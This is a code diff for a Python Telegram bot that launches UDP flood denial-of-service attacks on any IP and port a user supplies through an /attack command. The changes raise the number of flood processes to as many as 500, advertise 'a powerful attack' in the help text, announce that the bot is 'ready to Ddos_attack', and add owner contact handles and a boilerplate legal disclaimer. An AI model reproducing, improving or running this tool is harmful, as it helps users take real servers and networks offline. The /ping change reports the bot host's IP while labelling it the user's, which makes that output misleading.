@@ -8,10 +8,31 @@ import subprocess
 import sys
 import datetime
 import logging
+import socket
 
 # 🎛️ Function to install required packages
 def install_requirements():
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
+    # Check if requirements.txt file exists
+    try:
+        with open('requirements.txt', 'r') as f:
+            pass
+    except FileNotFoundError:
+        print("Error: requirements.txt file not found!")
+        return
+
+    # Install packages from requirements.txt
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
+        print("Installing packages from requirements.txt...")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: Failed to install packages from requirements.txt ({e})")
+
+    # Install pyTelegramBotAPI
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
+        print("Installing pyTelegramBotAPI...")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: Failed to install pyTelegramBotAPI ({e})")
 
 # Call the function to install requirements
 install_requirements()
@@ -52,7 +73,7 @@ def start_udp_flood(user_id, target_ip, target_port):
     processes = []
 
     # Allow up to 500 CPU threads for maximum performance
-    for _ in range(min(99, multiprocessing.cpu_count())):
+    for _ in range(min(500, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
@@ -76,16 +97,16 @@ def stop_attack(user_id):
     else:
         bot.send_message(user_id, "❌ No active attack found >ᴗ<")
 
-# 🕰️ Function to calculate bot uptime
+# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
 def get_uptime():
     uptime = datetime.datetime.now() - bot_start_time
-    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds
+    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷
 
 # 📜 Function to log commands and actions
 def log_command(user_id, command):
     logging.info(f"User ID {user_id} executed command: {command}")
 
-# 💬 Command handler for /start
+# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
@@ -114,7 +135,7 @@ def start(message):
         )
         bot.send_message(message.chat.id, welcome_message)
 
-# 💬 Command handler for /attack
+# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆ 
 @bot.message_handler(commands=['attack'])
 def attack(message):
     user_id = message.from_user.id
@@ -123,7 +144,7 @@ def attack(message):
         bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
         return
 
-    # Parse target IP and port from the command
+    # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
     try:
         command = message.text.split()
         target = command[1].split(':')
@@ -132,7 +153,29 @@ def attack(message):
         start_udp_flood(user_id, target_ip, target_port)
     except (IndexError, ValueError):
         bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")
+        
+"""""
+    Me             scammer 🏳️‍🌈
+ ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
+⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
+⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
+⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
+⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
+⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
+⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
+⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
+⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
+
+‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
+"""""
 # 💬 Command handler for /stop
 @bot.message_handler(commands=['stop'])
 def stop(message):
@@ -144,14 +187,22 @@ def stop(message):
 
     stop_attack(user_id)
 
-# 💬 Command handler for /id
-@bot.message_handler(commands=['id'])
+# 💬 Command handler for /id  
+@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
 def show_id(message):
-    user_id = message.from_user.id
-    log_command(user_id, '/id')
-    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}")
+    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
+    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
+    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
 
-# 💬 Command handler for /rules
+    # 👤 Sending the message with the user ID and username
+    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
+                                      f"👥 Your Username is: @{username}")
+
+    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
+    bot_owner = "all4outgaming1"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
+    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")
+
+# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
 @bot.message_handler(commands=['rules'])
 def rules(message):
     log_command(message.from_user.id, '/rules')
@@ -170,57 +221,127 @@ def rules(message):
     )
     bot.send_message(message.chat.id, rules_message)
 
-# 💬 Command handler for /owner
+# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
 @bot.message_handler(commands=['owner'])
 def owner(message):
     log_command(message.from_user.id, '/owner')
     bot.send_message(message.chat.id, "📞 Contact the owner: @all4outgaming1")
 
-# 💬 Command handler for /uptime
+# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
 @bot.message_handler(commands=['uptime'])
 def uptime(message):
     log_command(message.from_user.id, '/uptime')
     bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")
 
-# 💬 Command handler for /ping
+# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
 @bot.message_handler(commands=['ping'])
-def ping(message):
+@bot.message_handler(commands=['ping'])
+def ping_command(message):
     user_id = message.from_user.id
     log_command(user_id, '/ping')
 
-    # Measure ping time
+    bot.send_message(message.chat.id, "Checking your connection speed...")
+
+    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
     start_time = time.time()
     try:
-        # Use a simple DNS resolution to check responsiveness
+        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
         socket.gethostbyname('google.com')
-        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds
-        bot.send_message(message.chat.id, f"🛰️🌐 Ping: {ping_time:.2f} ms")
+        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
+        ping_response = (
+            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
+            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
+            f"Your Username: `{message.from_user.username}` 👤\n"
+        )
+        bot.send_message(message.chat.id, ping_response)
     except socket.gaierror:
         bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")
 
-# 💬 Command handler for /help
+def get_user_ip(user_id):
+    try:
+        ip_address = requests.get('https://api.ipify.org/').text
+        return ip_address
+    except:
+        return "IP Not Found 🤔"
+
+# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
 @bot.message_handler(commands=['help'])
 def help_command(message):
     log_command(message.from_user.id, '/help')
     help_message = (
-        "🆘 **Available Commands:**\n"
-        "/start - Start the bot\n"
-        "/attack `<IP>:<port>` - Start an attack\n"
-        "/stop - Stop the attack\n"
-        "/id - Show your user ID\n"
-        "/rules - View the bot rules\n"
-        "/owner - Contact the owner\n"
-        "/uptime - Get bot uptime\n"
-        "/ping - Check your connection ping\n"
-        "/help - Show this help message"
+        "🤔 **Need Help?** 🤔\n"
+        "Here are the available commands:\n"
+        "🔹 **/start** - Start the bot 🔋\n"
+        "💣 **/attack `<IP>:<port>`** - Launch a powerful attack 💥\n"
+        "🛑 **/stop** - Stop the attack 🛑️\n"
+        "👀 **/id** - Show your user ID 👤\n"
+        "📚 **/rules** - View the bot rules 📖\n"
+        "👑 **/owner** - Contact the owner 👑\n"
+        "⏰ **/uptime** - Get bot uptime ⏱️\n"
+        "📊 **/ping** - Check your connection ping 📈\n"
+        "🤝 **/help** - Show this help message 🤝"
     )
     bot.send_message(message.chat.id, help_message)
 
-# 🎮 Run the bot
+#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
+"""
+**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**
+
+This bot is owned and operated by @all4outgaming1 on Telegram and all4outgaming on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:
+
+* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
+* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @all4outgaming1 on Telegram and all4outgaming on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
+* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
+* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
+* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @all4outgaming1 on Telegram and all4outgaming on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
+* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @all4outgaming1 on Telegram and all4outgaming on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
+* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @all4outgaming1 on Telegram and all4outgaming on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
+* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
+* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
+* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @all4outgaming1 on Telegram and all4outgaming on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
+* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.
+
+**👋 THANK YOU FOR READING! 👋**
+"""
+# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
+"""
+███████▀▀▀░░░░░░░▀▀▀███████  
+████▀░░░░░░░░░░░░░░░░░▀████  
+███│░░░░░░░░░░░░░░░░░░░│███  
+██▌│░░░░░░░░░░░░░░░░░░░│▐██  
+██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
+██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
+██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
+██▌░│██████▌░░░▐██████│░▐██  
+███░│▐███▀▀░░▄░░▀▀███▌│░███  
+██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
+██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
+████▄─┘██▌░░░░░░░▐██└─▄████  
+█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
+████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
+█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
+███████▄░░░░░░░░░░░▄███████  
+██████████▄▄▄▄▄▄▄██████████  
+███████████████████████████  
+"""
+# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
 if __name__ == "__main__":
-    print(" 🪄 ☢️ Starting the Telegram bot...")  # Print statement for bot starting
+    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
+    print(" ⏱️ Initializing bot components...")  # Print statement for initialization
+
+    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
+    time.sleep(5)
+
+    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
+    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
+    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
+
     try:
         bot.polling(none_stop=True)
     except Exception as e:
         logging.error(f"Bot encountered an error: {e}")
-        time.sleep(15)  # Wait before restarting
+        print(" 🚨 Error: Bot encountered an error. Restarting in 15 seconds... ⏰")
+        time.sleep(15)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
+        print(" 🔁 Restarting the Telegram bot... 🔄")
+        print(" 💻 Bot is now restarting. Please wait... ⏳")
+        
